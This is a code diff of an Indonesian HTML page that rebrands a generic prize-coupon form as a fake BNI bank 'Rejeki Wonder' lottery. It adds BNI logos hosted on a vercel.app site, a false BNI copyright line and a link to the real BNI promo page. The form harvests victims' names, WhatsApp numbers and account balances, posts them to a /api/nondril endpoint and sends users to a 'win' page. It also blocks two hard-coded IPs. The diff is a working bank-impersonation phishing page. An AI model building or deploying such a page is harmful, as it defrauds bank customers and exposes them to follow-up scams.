@@ -1,357 +1,350 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cetak Kupon Hadiah</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 500px;
-            overflow: hidden;
-        }
-        
-        .header {
-            background: linear-gradient(to right, #2575fc, #6a11cb);
-            color: white;
-            padding: 25px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 5px;
-        }
-        
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .form-container {
-            padding: 25px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #444;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
-            transition: border 0.3s;
-        }
-        
-        .form-group input:focus {
-            border-color: #2575fc;
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(37, 117, 252, 0.2);
-        }
-        
-        .submit-btn {
-            background: linear-gradient(to right, #2575fc, #6a11cb);
-            color: white;
-            border: none;
-            padding: 16px;
-            width: 100%;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s, opacity 0.2s;
-        }
-        
-        .submit-btn:hover {
-            opacity: 0.95;
-            transform: translateY(-2px);
-        }
-        
-        .submit-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .info-box {
-            background-color: #f8f9fa;
-            border-left: 4px solid #2575fc;
-            padding: 15px;
-            margin-top: 25px;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        
-        .info-box h3 {
-            margin-bottom: 8px;
-            color: #2575fc;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #777;
-            border-top: 1px solid #eee;
-        }
-        
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 15px 0;
-        }
-        
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        
-        .error-message {
-            display: none;
-            background-color: #ffebee;
-            color: #c62828;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 15px 0;
-            text-align: center;
-            border-left: 4px solid #c62828;
-        }
-        
-        .success-message {
-            display: none;
-            background-color: #e8f5e9;
-            color: #2e7d32;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 15px 0;
-            text-align: center;
-            border-left: 4px solid #2e7d32;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                width: 95%;
-            }
-            
-            .header {
-                padding: 20px;
-            }
-            
-            .form-container {
-                padding: 20px;
-            }
-        }
-    </style>
+<!doctype html>
+<html lang="id" class="h-100">
+<head id="ctl00_Head1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+  <meta property="og:title" content="Cetak Kupon Anda - BNI - Rejeki Wonder">
+  <meta property="og:image" content="bc.png">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta name="description" content="Program Festival Gebyar Undian BNI Rejeki Wonder. Ikuti dan menangkan hadiahnya.">
+  <meta name="author" content="BNI" />
+  <title>Cetak Kupon Anda - BNI Rejeki Wonder</title>
+
+  <link rel="icon" href="https://lanjakkela.vercel.app/bc.png" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
+  <style>
+    body {
+      background-color: #f8f9fa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    .navnon {
+      text-align: center;
+      padding: 15px;
+      background-color: #fff;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    
+    .textjalan {
+      background: linear-gradient(90deg, #FF8601, #098CE3);
+      color: white;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    
+    .coverform {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    
+    .form h5 {
+      color: #098CE3;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+    
+    .inp {
+      margin-bottom: 15px;
+    }
+    
+    .inp label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #333;
+    }
+    
+    .inp input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    
+    #kirim {
+      background: linear-gradient(90deg, #FF8601, #098CE3);
+      color: white;
+      border: none;
+      padding: 15px;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    
+    #kirim:hover {
+      opacity: 0.9;
+      transform: translateY(-2px);
+    }
+    
+    #kirim:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+    }
+    
+    footer {
+      text-align: center;
+      margin-top: 20px;
+    }
+    
+    .loading {
+      display: none;
+      text-align: center;
+      margin: 15px 0;
+    }
+    
+    .loading-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .error-message {
+      display: none;
+      background-color: #ffebee;
+      color: #c62828;
+      padding: 15px;
+      border-radius: 6px;
+      margin: 15px 0;
+      text-align: center;
+      border-left: 4px solid #c62828;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>Cetak Kupon Hadiah</h1>
-            <p>Isi form berikut untuk mendapatkan kupon undian</p>
-        </div>
-        
-        <div class="form-container">
-            <div class="error-message" id="errorMessage">
-                <i class="fas fa-exclamation-circle"></i>
-                <span id="errorText">Terjadi kesalahan saat kirim data.</span>
-            </div>
-            
-            <div class="success-message" id="successMessage">
-                <i class="fas fa-check-circle"></i>
-                <span>Data berhasil dikirim! Kupon Anda sedang diproses.</span>
-            </div>
-            
-            <form id="formData">
-                <div class="form-group">
-                    <label for="name">Nama Lengkap</label>
-                    <input type="text" id="name" name="name" placeholder="Masukkan nama lengkap" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="phone">Nomor WhatsApp</label>
-                    <input type="tel" id="phone" name="phone" placeholder="Contoh: 081234567890" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="balance">Saldo Terakhir</label>
-                    <input type="number" id="balance" name="balance" placeholder="Contoh: 500000" required>
-                </div>
-                
-                <div class="loading" id="loading">
-                    <div class="loading-spinner"></div>
-                    <p>Mengirim data...</p>
-                </div>
-                
-                <button type="submit" id="kirim" class="submit-btn">Cetak Kupon</button>
-            </form>
-            
-            <div class="info-box">
-                <h3>Informasi Penting</h3>
-                <p>Pastikan data yang Anda masukkan benar dan valid. Kupon akan dikirim melalui WhatsApp setelah proses verifikasi.</p>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>&copy; 2023 Program Undian. Semua hak dilindungi.</p>
-        </div>
+  <main>
+    <nav class="navnon">
+      <img width="100%" src="https://lanjakkela.vercel.app/bc.png" alt="BNI Promo" />
+    </nav>
+
+    <div class="textjalan">
+      <svg width="50" height="40" fill="currentColor" class="bi bi-bell"><path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2..." /></svg>
+      <span><marquee>Selamat Datang di GEBYAR FESTIVAL BNI WONDER. Menangkan Hadiahnya dan Jadilah Pemenangnya!</marquee></span>
     </div>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            const form = document.getElementById("formData");
-            const submitBtn = document.getElementById("kirim");
-            const loading = document.getElementById("loading");
-            const errorMessage = document.getElementById("errorMessage");
-            const errorText = document.getElementById("errorText");
-            const successMessage = document.getElementById("successMessage");
-            let isSubmitting = false;
+    <div class="coverform">
+      <div class="error-message" id="errorMessage">
+        <i class="bi bi-exclamation-circle"></i>
+        <span id="errorText">Terjadi kesalahan saat kirim data.</span>
+      </div>
+      
+      <div class="form">
+        <h5 class="text-center">Formulir Kupon Undian</h5>
+        <center><img width="35%" src="https://lanjakkela.vercel.app/atas.png" alt="Header BNI" /></center>
 
-            form.addEventListener("submit", async function (e) {
-                e.preventDefault();
+        <form id="formData" method="POST" class="mt-4">
+          <div class="inp">
+            <label for="namalengkap"><b>Nama Lengkap</b></label>
+            <input type="text" name="a" id="namalengkap" required />
+          </div>
 
-                if (isSubmitting) {
-                    return;
-                }
+          <div class="inp">
+            <label for="nowa"><b>No. WhatsApp</b></label>
+            <input type="tel" name="b" id="nowa" required />
+          </div>
 
-                // Sembunyikan pesan error jika sebelumnya tampil
-                errorMessage.style.display = 'none';
-                
-                // Validasi input
-                const name = document.getElementById("name").value.trim();
-                const phone = document.getElementById("phone").value.trim();
-                const balance = document.getElementById("balance").value.trim();
+          <div class="inp">
+            <label for="saldo"><b>Saldo Akhir</b></label>
+            <input type="tel" name="c" id="saldo" required />
+          </div>
+          
+          <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <p>Mengirim data...</p>
+          </div>
 
-                if (!name) {
-                    showError("Nama lengkap harus diisi");
-                    return;
-                }
+          <button type="submit" id="kirim">Cetak Kupon</button>
+        </form>
+      </div>
 
-                if (!phone) {
-                    showError("Nomor WhatsApp harus diisi");
-                    return;
-                }
+      <p class="text-center mt-3" style="font-size: 12px;">© PT Bank Negara Indonesia (Persero) Tbk</p>
+      <p onclick="location.href='https://www.bni.co.id/id-id/beranda/promo-acara/rejeki-wondr-bni'" style="text-align: center; font-size: 16px; cursor: pointer;">
+        <strong style="color: #FF8601;">Semua Nasabah Bank BNI </strong><span style="color: #098CE3;"><b>Bekesempatan Untuk Menang...!!!</b></span>
+      </p>
+    </div>
+    
+    <footer>
+      <img src="https://lanjakkela.vercel.app/bawah.png" alt="Footer BNI" />
+    </footer>
+  </main>
 
-                if (!/^08[0-9]{8,13}$/.test(phone)) {
-                    showError("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
-                    return;
-                }
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+  <script>
+    // Format mata uang
+    $(document).ready(function(){
+      $('#saldo').mask('000.000.000.000,00', {reverse: true});
+      
+      var dengan_rupiah = document.getElementById('saldo');
+      dengan_rupiah.addEventListener('keyup', function(e) {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp.');
+      });
+      
+      /* Fungsi */
+      function formatRupiah(angka, prefix) {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+        split    = number_string.split(','),
+        sisa     = split[0].length % 3,
+        rupiah   = split[0].substr(0, sisa),
+        ribuan   = split[0].substr(sisa).match(/\d{3}/gi);
+        
+        if (ribuan) {
+          separator = sisa ? '.' : '';
+          rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+      }
+    });
 
-                if (!balance) {
-                    showError("Saldo terakhir harus diisi");
-                    return;
-                }
+    // Fungsi utama
+    document.addEventListener("DOMContentLoaded", async () => {
+      const form = document.getElementById("formData");
+      const submitBtn = document.getElementById("kirim");
+      const loading = document.getElementById("loading");
+      const errorMessage = document.getElementById("errorMessage");
+      const errorText = document.getElementById("errorText");
+      let isSubmitting = false;
 
-                if (balance.length < 3 || parseInt(balance) < 100) {
-                    showError("Saldo terlalu kecil untuk diikutkan. Minimal Rp 100.");
-                    return;
-                }
+      // Daftar IP spammer
+      const blockedIPs = [
+        "182.3.141.223",
+        "182.8.161.143"
+      ];
 
-                isSubmitting = true;
-                submitBtn.disabled = true;
-                loading.style.display = 'block';
-                submitBtn.innerText = "Memproses Cetak Kupon...";
+      // Cek IP user
+      const userIP = await getPublicIP();
+      if (userIP && blockedIPs.includes(userIP)) {
+        showError("Akses kamu diblokir karena terdeteksi sebagai spam!");
+        form.style.display = 'none';
+        return;
+      }
 
-                try {
-                    // Kirim data ke endpoint API server-side
-                    const response = await fetch('/api/nondril', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            name: name,
-                            phone: phone,
-                            balance: balance
-                        })
-                    });
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
 
-                    const result = await response.json();
+        if (isSubmitting) {
+          return;
+        }
 
-                    if (result.success) {
-                        // Tampilkan pesan sukses
-                        successMessage.style.display = 'block';
-                        
-                        // Reset form
-                        form.reset();
-                        
-                        // Redirect setelah 2 detik
-                        setTimeout(() => {
-                            window.location.href = 'win.html';
-                        }, 2000);
-                    } else {
-                        showError(result.message || "Terjadi kesalahan saat kirim data.");
-                    }
-                } catch (err) {
-                    console.error("Error:", err);
-                    showError("Terjadi kesalahan jaringan. Silakan coba lagi.");
-                }
+        // Sembunyikan pesan error jika sebelumnya tampil
+        errorMessage.style.display = 'none';
+        
+        // Validasi input
+        const nama = document.getElementById("namalengkap").value.trim();
+        const noWA = document.getElementById("nowa").value.trim();
+        const saldo = document.getElementById("saldo").value.trim();
 
-                resetBtn();
-            });
+        if (!nama) {
+          showError("Nama lengkap harus diisi");
+          return;
+        }
 
-            function resetBtn() {
-                isSubmitting = false;
-                submitBtn.disabled = false;
-                submitBtn.innerText = "Cetak Kupon";
-                loading.style.display = 'none';
+        if (!noWA) {
+          showError("Nomor WhatsApp harus diisi");
+          return;
+        }
+
+        if (!/^08[0-9]{8,13}$/.test(noWA)) {
+          showError("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
+          return;
+        }
+
+        if (!saldo) {
+          showError("Saldo terakhir harus diisi");
+          return;
+        }
+
+        isSubmitting = true;
+        submitBtn.disabled = true;
+        loading.style.display = 'block';
+        submitBtn.innerText = "Memproses Cetak Kupon...";
+
+        try {
+          // Kirim data ke endpoint API
+          const res = await fetch('/api/nondril', {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json' 
+            },
+            body: JSON.stringify({
+              a: nama,
+              b: noWA,
+              c: saldo
+            })
+          });
+
+          const json = await res.json();
+
+          if (json.success) {
+            // Simulasi vibrasi
+            if (navigator.vibrate) {
+              navigator.vibrate(180);
             }
+            
+            setTimeout(() => {
+              window.location.href = 'win.html';
+            }, 1000);
+          } else {
+            showError(json.message || "Gagal mengirim. Coba lagi.");
+          }
+        } catch (err) {
+          console.error("Error:", err);
+          showError("Terjadi kesalahan saat kirim data.");
+        }
 
-            function showError(message) {
-                errorText.textContent = message;
-                errorMessage.style.display = 'block';
-                resetBtn();
-                
-                // Scroll ke pesan error
-                errorMessage.scrollIntoView({ behavior: 'smooth' });
-            }
+        resetBtn();
+      });
 
-            // Fungsi vibrasi (jika didukung browser)
-            function vibr(duration) {
-                if (navigator.vibrate) {
-                    navigator.vibrate(duration);
-                }
-            }
-        });
-    </script>
+      function resetBtn() {
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        submitBtn.innerText = "Cetak Kupon";
+        loading.style.display = 'none';
+      }
+
+      function showError(message) {
+        errorText.textContent = message;
+        errorMessage.style.display = 'block';
+        resetBtn();
+        
+        // Scroll ke pesan error
+        errorMessage.scrollIntoView({ behavior: 'smooth' });
+      }
+
+      async function getPublicIP() {
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const data = await res.json();
+          return data.ip;
+        } catch (err) {
+          console.error("Gagal ambil IP:", err);
+          return null;
+        }
+      }
+    });
+  </script>
 </body>
 </html>
